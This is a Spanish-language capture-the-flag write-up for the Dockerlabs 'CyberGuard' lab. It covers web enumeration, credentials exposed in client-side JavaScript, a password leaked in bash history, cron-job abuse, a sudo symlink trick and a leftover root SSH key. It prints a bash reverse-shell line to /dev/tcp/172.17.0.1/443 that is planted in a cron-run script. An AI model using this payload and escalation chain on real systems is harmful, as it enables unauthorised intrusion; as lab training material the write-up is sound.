---
title: "Ciberguard - Dockerlabs CTF WRITEUP"
description: "CyberGuard es una máquina centrada en la escalada de privilegios mediante cronjobs inseguros, abuso de sudo y enlaces simbólicos."
pubDate: 2025-05-11
heroImage: "/img/ciberguard.png"
---

### Primero arracamos el contedor.

![[Screenshot from 2025-05-09 13-22-46.png]]

## 🔎 Enumeración

Comenzamos analizando la máquina con **nmap** para descubrir puertos abiertos y servicios activos.

![[Screenshot from 2025-05-09 13-27-10.png]]

Se observan dos puertos:

22/tcp SSH 80/tcp HTTP

Accedemos a la página web en el puerto 80 y encontramos una pagina web la cual parece un sitio empresarial, con un apartado sobre nosotros, formulario de contacto y login. Asi que nos centraremos en intentar acceder.

![[Screenshot from 2025-05-09 13-29-47.png]]

![[Screenshot from 2025-05-09 13-31-30.png]]

Para intentar acceder al login podemos probar con fuerza bruta o buscar si hay credenciales escondidos en el código fuente o simplemente por algun fichero de la web, para ello vamos a hacer algo de fuzzing web para ver si podemos ver algo mas o fichero con credenciales y ver el código fuente.

#### Código Fuente

![[Screenshot from 2025-05-09 13-37-39.png]]
no vemos mucha cosa aqui

#### Fuzzing Web

```bash
 gobuster dir --url http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,sh
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,sh
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 309] [--> http://172.17.0.2/images/]
/archiv               (Status: 301) [Size: 309] [--> http://172.17.0.2/archiv/]
/server-status        (Status: 403) [Size: 275]
Progress: 882240 / 882244 (100.00%)
===============================================================
Finished
===============================================================
```
---

Podemos ver que tenemos el típico directorio de imagenes y uno llamado archiv el cual accederemos para ver su contenido.

![[Screenshot from 2025-05-09 13-52-20.png]]
Vemos que hay dos ficheros 

Fichero con extensión .js el cual podemos ver que al final hay un apartado de credenciales validas, lo podria servidornos tal vez para iniciar sesion en la pagina web.

![[Screenshot from 2025-05-09 16-34-30.png]]

![[Screenshot from 2025-05-09 16-44-44.png]]

Iniciamos sesión y parece ser que hay como estadísticas o algo relación con la empresa, pero hay tres usuarios de los cuales podemos deducir que admin y cliente pertenecerán a la web, pero tal vez como el servidor tiene también habilitado SSH podemos intentar de acceder mediante ssh con el usuario Chloe.

## 🚀 Explotación

Accedemos mediante ssh usando el usuario Chloe que encontramos en la configuración de javascript, ya que hay un pequeño fallo de validación de credenciales de lado del cliente mediante javascript.

![[Screenshot from 2025-05-10 04-40-02.png]]

Buscamos si existen mas usuarios en en el sistema y si podemos ver sus archivos.

```bash
chloe@e8cb173e3a20:~$ ls -la /home/*
/home/chloe:
total 52
drwxr-x--- 1 chloe chloe 4096 Apr 18 22:14 .
drwxr-xr-x 1 root  root  4096 Apr 16 23:03 ..
-rw-rw-r-- 1 chloe chloe   39 May 10 05:34 .bash_history
-rw-r--r-- 1 chloe chloe  220 Apr 16 23:03 .bash_logout
-rw-r--r-- 1 chloe chloe 3771 Apr 16 23:03 .bashrc
drwx------ 2 chloe chloe 4096 Apr 18 10:41 .cache
drwxrwxr-x 3 chloe chloe 4096 Apr 18 11:16 .local
-rw-r--r-- 1 chloe chloe  807 Apr 16 23:03 .profile
-rw------- 1 chloe chloe    0 Apr 18 16:36 .python_history
drwxrwxr-x 2 chloe chloe 4096 Apr 18 10:45 Desktop
drwxrwxr-x 2 chloe chloe 4096 Apr 18 10:45 Documents
drwxrwxr-x 2 chloe chloe 4096 Apr 18 10:45 Images
ls: cannot open directory '/home/pablo': Permission denied
ls: cannot open directory '/home/ubuntu': Permission denied

/home/veronica:
total 52
drwxr-xrwx 1 veronica veronica 4096 Apr 18 16:35 .
drwxr-xr-x 1 root     root     4096 Apr 16 23:03 ..
-rw-r--r-- 1 veronica veronica   17 Apr 18 22:18 .bash_history
-rw-r--r-- 1 veronica veronica  220 Apr 16 23:00 .bash_logout
-rw-r--r-- 1 veronica veronica 3771 Apr 16 23:00 .bashrc
drwx------ 2 veronica veronica 4096 Apr 18 10:39 .cache
drwxrwxr-x 3 veronica veronica 4096 Apr 18 11:13 .local
-rw-r--r-- 1 veronica veronica  807 Apr 16 23:00 .profile
-rw------- 1 veronica veronica    7 Apr 18 16:35 .python_history
drwxrwxr-x 2 veronica veronica 4096 Apr 18 10:44 Desktop
drwxrwxr-x 2 veronica veronica 4096 Apr 18 10:44 Documents
drwxrwxr-x 2 veronica veronica 4096 Apr 18 10:44 Images
chloe@e8cb173e3a20:~$ 
```

Aqui tenemos tres usuarios en el sistema chloe el cual estamos ya logeados, veronica que podemos leer y ejecutar sus archivos pero no escribir y pablo que no tenemos permisos para acceder a su carpeta peronal.
Siguiente paso buscar una forma de intentar escalar al usuario veronica.

#### Buscamos si podemos usar sudo 

```bash
chloe@e8cb173e3a20:~$ sudo -l
[sudo] password for chloe: 
Sorry, user chloe may not run sudo on e8cb173e3a20.
chloe@e8cb173e3a20:~$ 
```

Vemos que no podemos usar sudo ni hay ningun binario que podamos usar con sudo para escalar a otro usuario mas privilegiado, vamos a probar de revisar el historial de bash de cada usuario, para ver si aparece algun tipo de filtracion y hay alguna contraseña o algo que nos ayude.

```bash
chloe@e8cb173e3a20:~$ cat /home/veronica/.bash_history 
dmVyb25pY2ExMjMK
chloe@e8cb173e3a20:~$ 

```


Revisando el de veronica que es el unico que podemos acceder a parte de chloe vemos algo que parece una contresaña.

![[Screenshot from 2025-05-10 05-02-20.png]]

Esta vez conseguimos acceder con veronica, y revisamos que podemos usar sudo, binarios suid y alguna tarea programada que quiza podamos explotar.

![[Screenshot from 2025-05-10 05-06-11.png]]

vale al parecer con crontab hay una tarea programada para que corra un script que hay en un directorio de la carpeta .local en el directorio de veronica, pero es un poco engañoso ya que no existe el usuario pedro en el sistema y la tarea no puede estar cumpliendose. 

Pero tal vez lo que podemos hacer es intentar cambiar el usuario pedro por pablo que si que existe y ver si ejecuta el script.

##### Cambiamos el usuario
* * * * * pablo /home/veronica/.local/script-h.sh > /tmp/hora/hora.log 2>&1

##### Compromas si en el directorio /tmp/hora/hora.log aparece la ejecución
![[Screenshot from 2025-05-10 05-12-37.png]]


![[Screenshot from 2025-05-10 05-16-35.png]]

viendo los permisos del script solo puede escribir pablo y miembros del grupo taller, así que viendo los grupos de veronica podemos intentar modificarlo para que saque una shell.

modificamos el script con una reverse shell 
veronica@e8cb173e3a20:~/.local$ nano script-h.sh 
veronica@e8cb173e3a20:~/.local$ cat script-h.sh 
#!/bin/bash


bash -i >& /dev/tcp/172.17.0.1/443 0>&1
veronica@e8cb173e3a20:~/.local$ 

y luego en nuestra maquina abrimos un netcat apuntando en mi caso al puerto 443, y nos abrira una shell con el usuario pablo, esperando unos minutos.

![[Screenshot from 2025-05-10 05-29-33.png]]

Dentro de pablo ahora vemos lo que hay en su directorio personal

``` bash
pablo@e8cb173e3a20:~$ ls -la *
ls -la *
Desktop:
total 8
drwxrwxr-x 2 pablo pablo 4096 Apr 18 10:45 .
drwxr-x--- 1 pablo pablo 4096 May  2 18:11 ..

Documents:
total 12
drwxrwxr-x 1 pablo pablo 4096 May  2 18:11 .
drwxr-x--- 1 pablo pablo 4096 May  2 18:11 ..
-rw-r--r-- 1 root  root    25 Apr 26 13:32 importante.txt

Images:
total 84
drwxrwxr-x 1 pablo pablo  4096 Apr 26 14:14 .
drwxr-x--- 1 pablo pablo  4096 May  2 18:11 ..
-rw-rw-r-- 1 pablo pablo 21494 Jan  1 14:40 htdhgjhj.jpg
-rw-rw-r-- 1 pablo pablo 49218 Apr 26 13:52 jhchgj.jpg
pablo@e8cb173e3a20:~$ 

```

y podemos ve que hay un fichero txt de propietario root que podemos leer.

```bash
pablo@e8cb173e3a20:~$ cat Documents/importante.txt
cat Documents/importante.txt
revisa el /root/root.txt
pablo@e8cb173e3a20:~$ 
```

nos dice que revisos un fichero root.txt que hay en /root, aunque parece que sea solo para root asi que buscaremos una forma de ser usuario root, para ello empezamos usando sudo -l

```bash
pablo@e8cb173e3a20:~$ sudo -l
sudo -l
Matching Defaults entries for pablo on e8cb173e3a20:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User pablo may run the following commands on e8cb173e3a20:
    (ALL) NOPASSWD: /usr/bin/python3 /opt/nllns/clean_symlink.py *.jpg
pablo@e8cb173e3a20:~$ 
```

y podemos usar un script en python que hay en /opt-nllns asi vamos a ello.

verificamos que existe
![[Screenshot from 2025-05-10 05-41-16.png]]

y examinando el script podemos ver que usando un enlace simbolico apuntando a una imagen lo borrara si contiene una ruta critica como /etc o /root o de lo contrario movera a /var/quarantine, entonces si queremos leer el fichero root.txt que nos menciono en importante.txt debemos intentar que el script no nos lo borre ocultando así la palabra root.

le pasamos un fichero que no se encuentro en /etc o /root y el script nos lo muestra
![[Screenshot from 2025-05-10 06-16-22.png]]

Le pasamos el fichero /root/root.txt y nos lo borrara

![[Screenshot from 2025-05-10 06-19-55.png]]

Para ello lo que tendriamos que hacer ya que el fichero a leer se encuentra en /root, seria crear un doble enlace simbolico primero a un directorio en el sea por ejemplo /tmp/safe y crear el enlace simbolico de /root/root.txt a /tmp/safe y de /tmp/safe/root.txt enviarlo a /home/pablo/Images/foto.jpg para que asi lea la segunda ruta y no vea la palabra root.

![[Screenshot from 2025-05-11 10-15-08.png]]

Pero esto creo que es una distraccion ya que encontre un id_rsa en la carpeta /tmp que parecer ser de root.

![[Screenshot from 2025-05-11 12-34-10.png]]

Nos lo traemos a un nuestra maquina y le damos permiso chmod 600 id_rsa
y con ssh -i id_rsa root@172.17.0.2, nos debe devolver la shell como root

![[Screenshot from 2025-05-11 12-36-06.png]]

---

## 🎯 Conclusiones

**CyberGuard** es un entorno ideal para practicar **escaladas de privilegios** reales encadenando errores comunes de configuración.

Permite entender cómo el abuso de tareas programadas, permisos de archivos mal gestionados y scripts inseguros puede llevar al compromiso total de un sistema.

---
